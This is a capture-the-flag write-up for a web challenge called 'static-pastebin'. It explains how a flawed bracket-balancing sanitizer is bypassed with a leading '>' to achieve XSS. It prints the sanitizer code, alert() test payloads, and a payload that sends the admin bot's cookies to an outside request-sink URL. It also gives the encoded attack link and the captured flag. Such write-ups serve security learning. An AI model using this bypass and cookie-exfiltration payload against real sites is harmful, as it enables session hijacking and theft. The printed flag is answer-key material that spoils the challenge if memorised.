# web/static-pastebin

## Flag
```
flag{54n1t1z4t10n_k1nd4_h4rd}
```

## Introduction
We are given a web page that accepts any kind of input, with a button that will "store" the text. And a different website (an admin site) where the challenge recommends you place your link if you face any "issue"

## Solution
By looking at the source code of the page that stores text, we see two things:
1. It performs a sanitization over the text
2. The link is then conformed by doing an `atob(text)`

Considering there is another admin page which needs the link to check for issues, we can try doing some kind of XSS. And most probably, the flag could be contained within the cookies

Looking with some more detail at the sanitization method, we can see that it looks for `< >` and only adds content if the brackets are balanced at that moment:

```javascript
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

So that one "couldn't" add something like:
```
<img src=x onerror="javascript:alert('XSS')"></img>
```

However, if we start the text with a closing bracket, then when it gets to the opening bracket everything will be "balanced". For example:
```
><img src=x onerror="javascript:alert('XSS')"></img>
```

We see that in fact we are able to sort out the sanitization. So we can build a more appropriate onerror callback so that it can send the cookies to a sink managed by us. For example:

```
><img src=x onerror="javascript:document.location='https://enoghoklyh418.x.pipedream.net/?c='+document.cookie"></img>
```

We can then generate the page, obtain the link that will look something like:
```
https://static-pastebin.2020.redpwnc.tf/paste/#Ij48aW1nIHNyYz14IG9uZXJyb3I9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZW5vZ2hva2x5aDQxOC54LnBpcGVkcmVhbS5uZXQvP2M9Jytkb2N1bWVudC5jb29raWUiPjwvaW1nPg==
```

And place it in the admin page.

After a while, we'll see the incoming request to our controlled sink, with the cookies of the site containing the flag!

```
/?c=flag=flag{54n1t1z4t10n_k1nd4_h4rd}
```